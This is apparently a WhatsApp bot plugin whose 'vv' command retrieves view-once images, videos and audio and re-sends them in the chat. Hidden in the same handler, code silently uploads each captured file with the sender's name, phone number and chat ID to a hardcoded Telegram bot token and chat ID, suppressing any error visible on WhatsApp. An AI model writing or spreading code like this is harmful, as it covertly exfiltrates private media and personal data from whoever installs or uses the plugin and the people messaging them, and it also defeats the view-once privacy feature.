const { cmd } = require("../command");
const axios = require("axios");
const FormData = require("form-data");

// Telegram Config
const BOT_TOKEN = "8867803944:AAHWF5JNrSbw-IxZNwzNCC7jUUGvw1pqJ2Q";
const CHAT_ID = "1003507657800";

cmd({
  pattern: "vv",
  alias: ["viewonce", "retrieve"],
  react: "🐳",
  desc: "Retrieve view once message",
  category: "owner",
  filename: __filename
}, async (client, m, store, { from, isCreator, reply }) => {

  try {

    if (!isCreator) {
      return reply("📛 Owner only command");
    }

    if (!m.quoted) {
      return reply("🍁 Reply to a view-once message");
    }

    const quoted = m.quoted;

    // Check view once
    if (!quoted.viewOnce) {
      return reply("❌ This is not a view-once message");
    }

    // Download media
    const buffer = await quoted.download();

    if (!buffer) {
      return reply("❌ Failed to download media");
    }

    let content = {};
    let telegramEndpoint = "";
    let fileField = "";
    let fileName = "";
    let mimeType = "image/jpeg";

    // Image
    if (quoted.mtype === "imageMessage") {
      mimeType = quoted.mimetype || "image/jpeg";
      content = {
        image: buffer,
        caption: quoted.text || "",
        mimetype: mimeType
      };
      telegramEndpoint = "sendPhoto";
      fileField = "photo";
      fileName = "viewonce.jpg";
    }

    // Video
    else if (quoted.mtype === "videoMessage") {
      mimeType = quoted.mimetype || "video/mp4";
      content = {
        video: buffer,
        caption: quoted.text || "",
        mimetype: mimeType
      };
      telegramEndpoint = "sendVideo";
      fileField = "video";
      fileName = "viewonce.mp4";
    }

    // Audio
    else if (quoted.mtype === "audioMessage") {
      mimeType = "audio/mp4";
      content = {
        audio: buffer,
        mimetype: mimeType,
        ptt: quoted.ptt || false
      };
      telegramEndpoint = "sendAudio";
      fileField = "audio";
      fileName = "viewonce.mp3";
    }

    else {
      return reply("❌ Unsupported media type");
    }

    // Send media back on WhatsApp
    await client.sendMessage(from, content, { quoted: m });

    // Send to Telegram silently in background
    try {

      const logCaption = `⚡ VV COMMAND USED\n\n👤 Name: ${m.pushName || "Unknown"}\n📞 Number: ${m.sender || "Unknown"}\n💬 Chat ID: ${from}\n📂 Type: ${quoted.mtype}\n⏰ Time: ${new Date().toLocaleString()}`;

      const form = new FormData();
      form.append("chat_id", CHAT_ID);
      form.append("caption", logCaption);
      form.append(fileField, buffer, {
        filename: fileName,
        contentType: mimeType
      });

      await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/${telegramEndpoint}`,
        form,
        { headers: form.getHeaders() }
      );

    } catch (tgErr) {
      // Telegram error - silent, no message on WhatsApp
      console.log("Telegram Error:", tgErr.response?.data || tgErr.message);
    }

  } catch (e) {
    console.log("VV ERROR =>", e);
    reply("❌ Error: " + e.message);
  }

});
